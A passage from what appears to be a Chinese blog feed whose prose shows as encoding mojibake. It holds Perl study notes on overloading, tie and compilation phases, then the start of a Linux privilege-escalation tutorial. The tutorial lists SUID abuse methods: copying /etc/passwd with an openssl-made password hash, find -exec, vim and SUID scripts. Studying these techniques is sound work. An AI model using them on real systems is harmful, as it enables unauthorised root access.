class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªè„šæœ¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.36</span>.<span class="hljs-number">0</span>;<br><span class="hljs-keyword">use</span> utf8;<br><span class="hljs-keyword">use</span> lib <span class="hljs-string">&#x27;/home/jie/scripts/perl/&#x27;</span>;<br><span class="hljs-keyword">use</span> My::Orkarin;<br><br><span class="hljs-keyword">my</span> $test = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">print</span> $test;<br></code></pre></td></tr></table></figure><p>åˆ™ä¼šæ‰“å° <code>100</code>.</p><h2 id="13-7-å…¬å…±é‡è½½å‡½æ•°"><a href="#13-7-å…¬å…±é‡è½½å‡½æ•°" class="headerlink" title="13.7 å…¬å…±é‡è½½å‡½æ•°"></a>13.7 å…¬å…±é‡è½½å‡½æ•°</h2><p>è§ä¹¦.</p><h2 id="13-8-ç»§æ‰¿å’Œé‡è½½"><a href="#13-8-ç»§æ‰¿å’Œé‡è½½" class="headerlink" title="13.8 ç»§æ‰¿å’Œé‡è½½"></a>13.8 ç»§æ‰¿å’Œé‡è½½</h2><p>é‡è½½è¿‡ç¨‹ä¸­å‘ç”Ÿç»§æ‰¿, åœ¨ <code>use overload</code> ä¸­æä¾›çš„æ˜¯å­—ç¬¦ä¸²å¦‚ <code>use overload &#39;+&#39; =&gt; &#39;add&#39;</code> è€Œä¸æ˜¯å‡½æ•°å¼•ç”¨, æ­¤æ—¶èƒ½è¢«è§£é‡Šä¸ºæ–¹æ³•, å¹¶ä»çˆ¶ç±»ä¸­ç»§æ‰¿.</p><p>è¿˜æœ‰è§ä¹¦</p><h2 id="13-9-è¿è¡Œæ—¶é‡è½½"><a href="#13-9-è¿è¡Œæ—¶é‡è½½" class="headerlink" title="13.9 è¿è¡Œæ—¶é‡è½½"></a>13.9 è¿è¡Œæ—¶é‡è½½</h2><p>å› ä¸º <code>use</code> è¯­å¥æ˜¯åœ¨ç¼–è¯‘æ—¶é‡è½½çš„, åœ¨è¿è¡Œæ˜¯æ”¹å˜é‡è½½çš„å”¯ä¸€æ–¹æ³•æ˜¯:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;use overload &#x27;+&#x27; =&gt; \&amp;my_add&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="13-10-é‡è½½è¯Šæ–­"><a href="#13-10-é‡è½½è¯Šæ–­" class="headerlink" title="13.10 é‡è½½è¯Šæ–­"></a>13.10 é‡è½½è¯Šæ–­</h2><p>è§ä¹¦</p><h1 id="ç¬¬åå››ç« -æ†ç»‘-tie-å˜é‡"><a href="#ç¬¬åå››ç« -æ†ç»‘-tie-å˜é‡" class="headerlink" title="ç¬¬åå››ç«  æ†ç»‘ (tie) å˜é‡"></a>ç¬¬åå››ç«  æ†ç»‘ (tie) å˜é‡</h1><p><code>tie</code> å¯ç¿»è¯‘æˆæ†ç»‘, ä¹Ÿå¯æ˜¯é¢†å¸¦. <code>tie</code> æ„Ÿè§‰åƒæ˜¯ä¸€ç§è°ƒç”¨å™¨, å®ƒä¼šä½¿å˜é‡æœ‰ä¸€äº›é»˜è®¤çš„åŠ¨ä½œ. (ä¹Ÿå°±æ˜¯é»˜è®¤è°ƒç”¨ä¸€äº›åŠ¨ä½œ)</p><p>Perl å†…å»ºçš„ <code>dbmopen</code> å’Œ <code>dbmclose</code> å‡½æ•°, å¯ä»¥å°†æ•£åˆ—å˜é‡å’Œæ•°æ®åº“ç»‘åœ¨ä¸€èµ·. (ç°åœ¨è¿™ä¸¤ä¸ªå‡½æ•°å°±æ˜¯ä¾é  <code>tie</code> æ¥å®ç°)</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">tie</span> VARIABLE, CLASSNAME, LIST;<br>$object = <span class="hljs-keyword">tied</span> VARIABLE;<br></code></pre></td></tr></table></figure><p>(è¿™ä¸ª <code>LIST</code> åé¢å†è¯´, å…¶ä¹Ÿæ˜¯ä¼ é€’ç»™ <code>TIESCALAR</code> ä¹‹ç±»å‡½æ•°çš„å‚æ•°)</p><p><code>tie</code> å¯ä»¥æŠŠä¸€ä¸ªæ ‡é‡, æ•°ç»„, æ•£åˆ—æˆ–è€…æ–‡ä»¶å¥æŸ„ç»‘åˆ°ä¸€ä¸ªç±»ä¸Š, è¿˜è¦æä¾›ä¸€ä¸ªæ–¹æ³•åç§°çš„åˆ—è¡¨. æä¾›çš„ç¬¬ä¸€ä¸ªæ–¹æ³•ä¼šåœ¨ç»‘å®šæ—¶è°ƒç”¨ (å³, è°ƒç”¨ä¸€ä¸ªæ„é€ å‡½æ•°, å…¶åœ¨æˆåŠŸæ—¶ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡, è¿™ä¸ªå¯¹è±¡å¯ä»¥ç”¨ <code>tied</code> å–å‡º)</p><p><mark>æ–­å¼€</mark>å˜é‡å’Œç±»çš„è”ç³»å¯ä»¥ç”¨ <code>untie</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">untie</span> VARIABLE;<br></code></pre></td></tr></table></figure><p>ç”¨ <code>tie</code> ç»‘å®šçš„å˜é‡å¯ä»¥è°ƒç”¨é¢„å®šåç§°çš„æ–¹æ³•, è¿™äº›æ–¹æ³•ä¸ºå…¨å¤§å†™. è°ƒç”¨çš„æ„é€ å‡½æ•°åŒ…æ‹¬:</p><ul><li><code>TIESCALAR</code></li><li><code>TIEARRAY</code></li><li><code>TIEHASH</code></li><li><code>TIEHANDLE</code></li></ul><p>Perl ä¸­å‡ ä¹æ‰€æœ‰é¢„å®šä¹‰åŒ…, å˜é‡å’Œæ–‡ä»¶å¥æŸ„éƒ½é‡‡ç”¨å¤§å†™.</p><h2 id="14-1-ç»‘å®šæ ‡é‡"><a href="#14-1-ç»‘å®šæ ‡é‡" class="headerlink" title="14.1 ç»‘å®šæ ‡é‡"></a>14.1 ç»‘å®šæ ‡é‡</h2><p>è¦å®ç°ä¸€ä¸ªæ†ç»‘çš„æ ‡é‡, ä¸€ä¸ªç±»å¿…é¡»å®šä¹‰ä»¥ä¸‹æ–¹æ³•:</p><ul><li><code>TIESCALAR</code>, ç»‘å®šæ—¶è‡ªåŠ¨è°ƒç”¨, ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦ç»‘å®šçš„ç±»å.</li><li><code>FETCH</code>, è¯»å–æ—¶è°ƒç”¨, ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æœ¬èº«</li><li><code>STORE</code>, ç»™å˜é‡èµ‹å€¼æ—¶è°ƒç”¨, ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æœ¬èº«, ç¬¬äºŒä¸ªå‚æ•°æ˜¯å€¼</li><li>(å¯èƒ½ è¿˜æœ‰ <code>DESTROY</code>, åœ¨å¯¹è±¡çš„æœ€åä¸€ä¸ªå¼•ç”¨æ¶ˆå¤±æ—¶è°ƒç”¨, å³åœ¨ç¨‹åºç»ˆæ­¢æˆ–è°ƒç”¨ <code>untie</code> æ—¶è°ƒç”¨)</li></ul><p>åœ¨è§£é™¤ç»‘å®šæ—¶è°ƒç”¨:</p><ul><li><code>UNTIE</code></li></ul><p><code>untie</code> ä¼šåˆ é™¤ <code>tie</code> ä½¿ç”¨çš„å¼•ç”¨.</p><p><code>Tie::Scalar</code> å’Œ <code>Tie::StdScalar</code> æ¨¡å—ä¸­å®šä¹‰äº†æ‰€æœ‰ä¸Šè¿°æ–¹æ³•, æä¾›ç®€å•çš„ç”¨æ³•.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Test;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">TIESCALAR</span> </span>&#123;<br>    <span class="hljs-keyword">bless</span> \<span class="hljs-keyword">my</span> $self, <span class="hljs-keyword">shift</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">STORE</span> </span>&#123;<br>    $&#123; $_[<span class="hljs-number">0</span>] &#125; = $_[<span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">FETCH</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $value = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> $$value;<br>&#125;<br><br><span class="hljs-keyword">package</span> main;<br><br><span class="hljs-keyword">my</span> $test;<br><span class="hljs-keyword">tie</span> $test, <span class="hljs-string">&quot;Test&quot;</span>;<br>$test = <span class="hljs-number">100</span>;<br><br><span class="hljs-keyword">print</span> $test;<br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿæœ‰:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $obj = <span class="hljs-keyword">tie</span> $test, <span class="hljs-string">&quot;Test&quot;</span>;<br><br><span class="hljs-comment"># ç­‰ä»·äºä½¿ç”¨ `tied` è·å–</span><br><br><span class="hljs-keyword">my</span> $obj = <span class="hljs-keyword">tied</span> $test;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>$obj</code> å¯ä»¥è°ƒç”¨ <code>Test</code> ç±»çš„å…¶ä»–æ–¹æ³•. ä½† <code>tie</code> çš„è¿”å›å€¼å¸¸å¸¸è¢«çœç•¥. è¿™ä¸ªå¯¹è±¡å¯ä»¥ç”¨ <code>tied</code> è·å–.</p><p>è¿™é‡Œ <code>TIESCALAR</code> ä¸­çš„ <code>my $self</code>, è¿™ä¸ªå˜é‡å«ä»€ä¹ˆåå­—å…¶å®æ— æ‰€è°“, å…¶ä½œç”¨å°±æ˜¯é…åˆ <code>bless</code> è¿”å›ä¸€ä¸ªè¢« <code>bless</code> çš„å¼•ç”¨ç»™è¦ <code>tie</code> çš„å˜é‡, æ‰€ä»¥è¯´è¿™ä¸ªå˜é‡æœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªå¼•ç”¨, åªä¸è¿‡å…¶è¡Œä¸ºè¢«é‡è½½äº†. (å› ä¸ºå…¶å¤„äºè¯æ³•ä½œç”¨åŸŸ, å‡ºäº†ä½œç”¨åŸŸä¹‹å, å°±ä¼šå˜ä¸ºåŒ¿å)</p><p><code>STORE</code> è¿™ä¸ªæ˜¯åœ¨èµ‹å€¼æ—¶è°ƒç”¨çš„, ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æœ¬èº« (ä¹Ÿå°±æ˜¯ä¸€ä¸ªå¼•ç”¨), ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦èµ‹çš„å€¼.</p><p>ä¼ å…¥ <code>FETCH</code> çš„ç¬¬ä¸€ä¸ªå€¼ä¹Ÿæ˜¯æœ¬èº« (ä¹Ÿå°±æ˜¯ä¸€ä¸ªå¼•ç”¨).</p><h3 id="14-1-1-æ ‡é‡æ†ç»‘æ–¹æ³•"><a href="#14-1-1-æ ‡é‡æ†ç»‘æ–¹æ³•" class="headerlink" title="14.1.1 æ ‡é‡æ†ç»‘æ–¹æ³•"></a>14.1.1 æ ‡é‡æ†ç»‘æ–¹æ³•</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Test;<br><br><span class="hljs-keyword">tie</span> $test, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;/tmp/test.txt&quot;</span><br></code></pre></td></tr></table></figure><h2 id="14-2-ç»‘å®šæ•°ç»„"><a href="#14-2-ç»‘å®šæ•°ç»„" class="headerlink" title="14.2 ç»‘å®šæ•°ç»„"></a>14.2 ç»‘å®šæ•°ç»„</h2><p>åªè¦å®šä¹‰äº† <code>FETCH</code> å’Œ <code>STORE</code>, å¯¹è±¡åŒ…å«ä»€ä¹ˆæ ·çš„æ•°æ®ç»“æ„å¹¶ä¸é‡è¦.</p><h1 id="ç¬¬18ç« -ç¼–è¯‘"><a href="#ç¬¬18ç« -ç¼–è¯‘" class="headerlink" title="ç¬¬18ç«  ç¼–è¯‘"></a>ç¬¬18ç«  ç¼–è¯‘</h1><h2 id="18-1-Perl-ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸ"><a href="#18-1-Perl-ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="18.1 Perl ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸ"></a>18.1 Perl ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸ</h2><p>å¯ä»¥æŠŠ Perl ç¨‹åºåˆ†è£‚ä¸ºå››ä¸ªç‹¬ç«‹çš„é˜¶æ®µ, æ¯ä¸ªé˜¶æ®µéƒ½æœ‰è‡ªå·±çš„ç‹¬ç«‹çš„å­—é˜¶æ®µ.</p><h3 id="1-ç¼–è¯‘é˜¶æ®µ"><a href="#1-ç¼–è¯‘é˜¶æ®µ" class="headerlink" title="1. ç¼–è¯‘é˜¶æ®µ:"></a>1. ç¼–è¯‘é˜¶æ®µ:</h3><p>Perl ç¼–è¯‘å™¨æŠŠä½ çš„ç¨‹åºè½¬æ¢æˆä¸€ä¸ªå« <mark>åˆ†ææ ‘</mark> çš„æ•°æ®ç»“æ„. <code>use</code> å’Œ <code>no</code> å®é™…ä¸Šéƒ½æ˜¯ä¼ªè£…çš„ <code>BEGIN</code> å—.</p><p>è¯æ³•å£°æ˜ä¹Ÿåšä¸Šè®°å·, ä½†æ˜¯è¿˜ä¸æ‰§è¡Œç»™å®ƒä»¬çš„èµ‹å€¼.</p><p>å¸¸é‡è¡¨è¾¾å¼éƒ½é¢„å…ˆè®¡ç®—.</p><h3 id="2-ä»£ç ç”Ÿæˆé˜¶æ®µ-å¯é€‰"><a href="#2-ä»£ç ç”Ÿæˆé˜¶æ®µ-å¯é€‰" class="headerlink" title="2. ä»£ç ç”Ÿæˆé˜¶æ®µ (å¯é€‰)"></a>2. ä»£ç ç”Ÿæˆé˜¶æ®µ (å¯é€‰)</h3><p>æŠŠç¼–è¯‘å®Œæˆçš„ ( ä½†è¿˜æ²¡è¿è¡Œçš„ ) ç¨‹åºè½¬æ¢æˆ C æºç¨‹åºæˆ–è€…ä¸²è¡Œçš„ Perl å­—èŠ‚ç  â€“ ä¸€ä¸ªä»£è¡¨å†…éƒ¨ Perl æŒ‡ä»¤çš„æ•°å€¼åºåˆ—.</p><h3 id="3-åˆ†ææ ‘é‡æ„é˜¶æ®µ-å¯é€‰"><a href="#3-åˆ†ææ ‘é‡æ„é˜¶æ®µ-å¯é€‰" class="headerlink" title="3. åˆ†ææ ‘é‡æ„é˜¶æ®µ (å¯é€‰)"></a>3. åˆ†ææ ‘é‡æ„é˜¶æ®µ (å¯é€‰)</h3><p>è¿™ä¸ªé˜¶æ®µåªæœ‰åœ¨å‘ç”Ÿäº†ä»£ç ç”Ÿæˆå¹¶ä¸”ä½ é€‰æ‹©ç”Ÿæˆå­—èŠ‚ç çš„æƒ…å†µä¸‹å­˜åœ¨.</p><h3 id="4-æ‰§è¡Œé˜¶æ®µ"><a href="#4-æ‰§è¡Œé˜¶æ®µ" class="headerlink" title="4. æ‰§è¡Œé˜¶æ®µ"></a>4. æ‰§è¡Œé˜¶æ®µ</h3><p>è§£é‡Šå™¨æ‹¿æ¥åˆ†ææ ‘ (å¯èƒ½æ˜¯ç›´æ¥ä»ç¼–è¯‘å™¨æ¥çš„æˆ–è€…é—´æ¥ä»ä»£ç ç”Ÿæˆé˜¶æ®µä»¥åŠéšåçš„åˆ†ææ ‘é‡æ„é˜¶æ®µè¿‡æ¥çš„) å¹¶ä¸”è¿è¡Œ.</p><h2 id="18-2-ç¼–è¯‘ä½ çš„ä»£ç "><a href="#18-2-ç¼–è¯‘ä½ çš„ä»£ç " class="headerlink" title="18.2 ç¼–è¯‘ä½ çš„ä»£ç "></a>18.2 ç¼–è¯‘ä½ çš„ä»£ç </h2><p>Perl æ€»æ˜¯å¤„äºä¸¤ç§æ“ä½œæ¨¡å¼ä¹‹ä¸€: è¦ä¹ˆå®ƒåœ¨ç¼–è¯‘ä½ çš„ç¨‹åº, è¦ä¹ˆæ˜¯åœ¨æ‰§è¡Œå®ƒ â€“ ä»æ¥ä¸ä¼šåŒæ—¶å¤„äºä¸¤ç§æ¨¡å¼.</p><p>é™¤äº†å¤„ç† <code>BEGIN</code> å—çš„è§£é‡Šå™¨ä»¥å¤–, ç¼–è¯‘å™¨é»˜è®¸ä¸‰ä¸ªæ¦‚å¿µä¸Šçš„è¿‡ç¨‹å¤„ç†ä½ çš„ç¨‹åº.</p><p><mark>è¯æ³•åˆ†æå™¨ (lexer)</mark>  æ‰«æä½ çš„ç¨‹åºé‡Œçš„æ¯ä¸€ä¸ªæœ€å°çš„å•å…ƒ â€“ token.</p><p><mark>åˆ†æå™¨ (parser)</mark> ä»¥ Perl è¯­è¨€çš„è¯­æ³•ä¸ºåŸºç¡€. è¯•å›¾é€šè¿‡æŠŠè¿™äº› token ç»„åˆæˆæ›´å¤§çš„æ„é€ , æ¯”å¦‚è¡¨è¾¾å¼å’Œè¯­å¥, æ¥è·å–æ„ä¹‰.</p><p><mark>ä¼˜åŒ–å™¨ (optimizer)</mark>  å¯¹è¿™äº›è¯æ³•çš„ç»„åˆè¿›è¡Œé‡æ–°æ’åˆ—å¹¶ä¸”æŠŠå®ƒä»¬å½’å‡æˆæ›´æœ‰æ•ˆçš„åºåˆ—.</p><p>è¿™äº›è¿‡ç¨‹å¹¶ä¸æ˜¯åœ¨ç›¸äº’ç‹¬ç«‹çš„é˜¶æ®µè¿›è¡Œ, è€Œæ˜¯åŒæ—¶å‘ç”Ÿ, å¹¶ä¸”ç›¸äº’ä¹‹é—´æœ‰å¤§é‡äº¤äº’.</p><h2 id="18-3-æ‰§è¡Œä½ çš„ä»£ç "><a href="#18-3-æ‰§è¡Œä½ çš„ä»£ç " class="headerlink" title="18.3 æ‰§è¡Œä½ çš„ä»£ç "></a>18.3 æ‰§è¡Œä½ çš„ä»£ç </h2><p>Perl é‡Œæ²¡æœ‰ä½¿ç”¨ç¡¬ä»¶ç¨‹åºè®¡æ•°å™¨, è€Œæ˜¯ç”±è§£é‡Šå™¨è¿½è¸ªå½“å‰è¦æ‰§è¡Œçš„æ“ä½œæ•°.</p><p>Perl é‡Œä¹Ÿæ²¡æœ‰å †æ ˆæŒ‡é’ˆ, è§£é‡Šå™¨æœ‰å®ƒè‡ªå·±çš„è™šæ‹Ÿå †æ ˆ, è¿™ä¸ªå †æ ˆéå¸¸é‡è¦, å› ä¸º Perl è™šæ‹Ÿæœºæ˜¯ä¸€ä¸ªåŸºäºå †æ ˆçš„æœºå™¨.</p><p>Perl æ“ä½œç åœ¨å†…éƒ¨ç§°ä½œ PP ä»£ç  (push-pop codes), å› ä¸ºä»–ä»¬æ“ä½œè§£é‡Šå™¨çš„è™šæ‹Ÿå †æ ˆä»¥å¯»æ‰¾æ‰€æœ‰æ“ä½œæ•°, å¤„ç†ä¸´æ—¶æ•°å€¼, è¿˜æœ‰å¤„ç†æ‰€æœ‰ç»“æœ.</p><p>Perl çš„è™šæ‹Ÿæœºæ›¿ä½ è¿½è¸ªä¸€å †åŠ¨æ€ç¯å¢ƒ.</p><p>Perl ç»´æŠ¤ä¸å°‘å †æ ˆ:</p><ul><li>æ“ä½œæ•°å †æ ˆ (operand stack)</li><li>ä¿å­˜å †æ ˆ (save stack)</li><li>èŒƒå›´å †æ ˆ (scope stack)</li><li>ç¯å¢ƒå †æ ˆ (context stack)</li><li>ç¯å¢ƒè·³è½¬å †æ ˆ (jumpenv stack)</li><li>è¿”å›å †æ ˆ (return stack)</li><li>æ ‡è®°å †æ ˆ (mark stack)</li><li>é€’å½’è¯æ³•å¡«å……å †æ ˆ (recursive lexical pad stacks)</li><li>å­˜æ”¾æ‰€æœ‰ C å˜é‡çš„ C å †æ ˆ</li></ul><h2 id="18-4-ç¼–è¯‘å™¨åç«¯"><a href="#18-4-ç¼–è¯‘å™¨åç«¯" class="headerlink" title="18.4 ç¼–è¯‘å™¨åç«¯"></a>18.4 ç¼–è¯‘å™¨åç«¯</h2><p>è¿™äº›åç«¯å¯ä»¥æŠŠç¼–è¯‘å¥½çš„æ“ä½œç ä¸²è¡ŒåŒ–å’Œå­˜å‚¨åˆ°ä»»ä½•å¤–éƒ¨æ–‡ä»¶ä¸­, ç”šè‡³å¯ä»¥æŠŠå®ƒä»¬è½¬æ¢æˆå‡ ç§ä¸åŒé£æ ¼çš„ C ä»£ç .</p><h2 id="18-5-ä»£ç ç”Ÿæˆå™¨"><a href="#18-5-ä»£ç ç”Ÿæˆå™¨" class="headerlink" title="18.5 ä»£ç ç”Ÿæˆå™¨"></a>18.5 ä»£ç ç”Ÿæˆå™¨</h2><p>ç›®å‰çš„ä¸‰ç§æŠŠ Perl æ“ä½œç è½¬æ¢æˆå…¶ä»–æ ¼å¼çš„åç«¯éƒ½æ˜¯å¤„äºå®éªŒé˜¶æ®µçš„.</p><h3 id="18-5-1-å­—èŠ‚ç ç”Ÿæˆå™¨"><a href="#18-5-1-å­—èŠ‚ç ç”Ÿæˆå™¨" class="headerlink" title="18.5.1 å­—èŠ‚ç ç”Ÿæˆå™¨"></a>18.5.1 å­—èŠ‚ç ç”Ÿæˆå™¨</h3><p><code>B::Bytecode</code> æ¨¡å—å°†åˆ†ææ ‘çš„æ“ä½œç ä»¥å¹³å°æ— å…³çš„ç¼–ç å†™å‡º.</p><p>perlcc å‘½ä»¤çŸ¥é“æ€ä¹ˆæŠŠä¸€ä¸ª Perl æºç¨‹åºè½¬æ¢æˆä¸€ä¸ªç¼–è¯‘æˆå­—èŠ‚ç çš„ Perl ç¨‹åº.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perlcc -b -o pbyscript srcscript<br></code></pre></td></tr></table></figure><p><code>ByteLoader</code> æ¨¡å—æ˜¯æºç è¿‡æ»¤å™¨, ä»–çŸ¥é“å¦‚ä½•æŠŠ <code>B::Bytecode</code> ç”Ÿæˆçš„ä¸²è¡Œçš„å­—èŠ‚ç åˆ†è§£å¹¶é‡æ–°ç»„åˆæˆåŸæ¥çš„åˆ†ææ ‘.</p><h3 id="18-5-2-C-ä»£ç ç”Ÿæˆå™¨"><a href="#18-5-2-C-ä»£ç ç”Ÿæˆå™¨" class="headerlink" title="18.5.2 C ä»£ç ç”Ÿæˆå™¨"></a>18.5.2 C ä»£ç ç”Ÿæˆå™¨</h3><p><code>B::C</code> å’Œ <code>B::CC</code> æ¨¡å—éƒ½ç”Ÿæˆ C ä»£ç , è€Œä¸æ˜¯ä¸²è¡ŒåŒ–çš„ Perl æ“ä½œç .</p><h2 id="18-6-æå‰ç¼–è¯‘-å›å¤´è§£é‡Š"><a href="#18-6-æå‰ç¼–è¯‘-å›å¤´è§£é‡Š" class="headerlink" title="18.6 æå‰ç¼–è¯‘, å›å¤´è§£é‡Š"></a>18.6 æå‰ç¼–è¯‘, å›å¤´è§£é‡Š</h2><p>ä¸€ä¸ªä¼ ç»Ÿ: å¦‚æœä¸€ä¸ªå­è¿‡ç¨‹ä¼šè¢«ç¼–è¯‘å™¨æˆ–è€…è§£é‡Šå™¨è‡ªåŠ¨å‡ºå‘, é‚£ä¹ˆç”¨å¤§å†™å­—æ¯ä¸ºä¹‹å‘½å.</p><p>ä¸ç¨‹åºçš„ç”Ÿå‘½æœŸçš„ä¸åŒé˜¶æ®µç›¸è¿çš„æ˜¯å¦å¤–å››ä¸ªå­è¿‡ç¨‹:</p><ul><li><code>BEGIN</code></li><li><code>CHECK</code></li><li><code>INIT</code></li><li><code>END</code></li></ul><p>å®ƒä»¬å‰é¢çš„ <code>sub</code> å…³é”®å­—æ˜¯å¯é€‰çš„, å¯èƒ½æœ€å¥½å«å®ƒä»¬ â€œè¯­å¥å—â€, å› ä¸ºå®ƒä»¬ä»æŸç§ç¨‹åº¦ä¸Šæ¥è¯´æ›´åƒå‘½åè¯­å¥å—è€Œä¸åƒå­è¿‡ç¨‹.</p><p>è¿è¡Œé¡ºåº:</p><ul><li><code>BEGIN</code>, å¦‚æœåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ç¢°åˆ°, åˆ™åœ¨ç¼–è¯‘å…¶ä»–æ–‡ä»¶ä¹‹å‰å°½å¯èƒ½å¿«åœ°è¿è¡Œ</li><li><code>CHECK</code>, å½“ç¼–è¯‘å®Œæˆå, ä½†åœ¨ç¨‹åºå¼€å§‹ä¹‹å‰è¿è¡Œ</li><li><code>INIT</code>, åœ¨ç¨‹åºçš„ä¸»æµç¨‹å¼€å§‹æ‰§è¡Œä¹‹å‰è¿è¡Œ</li><li><code>END</code>, åœ¨ç¨‹åºæ‰§è¡Œç»“æŸä¹‹åè¿è¡Œ</li></ul>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux-ææƒ</title>
    <link href="/2022/12/08/Linux-%E6%8F%90%E6%9D%83/"/>
    <url>/2022/12/08/Linux-%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1QS4y1277a/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><p>éƒ½æ˜¯å…ˆç”¨ root æ¥æ¨¡æ‹Ÿé…ç½®ä¸å½“.</p><h1 id="åˆ©ç”¨-SUID-äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œææƒ"><a href="#åˆ©ç”¨-SUID-äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œææƒ" class="headerlink" title="åˆ©ç”¨ SUID äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œææƒ"></a>åˆ©ç”¨ SUID äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œææƒ</h1><p>SUID ä¸º Set UID, å°±æ˜¯è®¾ç½®ç”¨æˆ·æƒé™.</p><p>å½“ä½ å…·æœ‰ SUID æƒé™äºŒè¿›åˆ¶æ–‡ä»¶çš„å¯æ‰§è¡Œæƒé™æ—¶ï¼Œæ‰§è¡Œæ—¶ä¼šè·å¾—å±ä¸»çš„æƒé™.</p><p>SUID åªèƒ½æ·»åŠ ç»™äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸”åªæœ‰åœ¨è¿è¡Œæ—¶æ‰ä¼šè·å¾—å±ä¸»æƒé™.</p><p>æ¯”å¦‚, ä½ ç»™ <code>rm</code> å‘½ä»¤æ·»åŠ äº† SUID æƒé™ï¼Œå‡è®¾ <code>test</code> æ–‡ä»¶æ˜¯ root ç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶ï¼Œæ­¤æ—¶, ä½ æ˜¯æ™®é€šç”¨æˆ·ï¼Œå…·æœ‰ <code>rm</code> çš„æ‰§è¡Œæƒé™ï¼Œ é‚£ä¹ˆ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">rm</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>å°†ç›´æ¥åˆ é™¤è¿™ä¸ªæ–‡ä»¶.</p><p>å¸¸è§åˆ©ç”¨æ–¹å¼:</p><ul><li><code>cp</code> å‡º <code>/etc/passwd</code>, åˆ©ç”¨ <code>openssl</code> ç”Ÿæˆç¬¦åˆ passwd æ ¼å¼çš„å¯†ç </li><li><code>find</code> çš„ <code>exec</code> å‚æ•°, æŒ‡å®šä¸€ä¸ªå‘½ä»¤å¯¹æœç´¢çš„ç»“æœè¿›è¡Œå¤„ç†</li><li><code>vim</code></li><li>è„šæœ¬, ç»™æ™®é€šè„šæœ¬æ·»åŠ  suid</li></ul><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ find <span class="hljs-built_in">test</span> -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;whoami&quot;</span> \;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å…·æœ‰ SUID æƒé™çš„æ–‡ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ 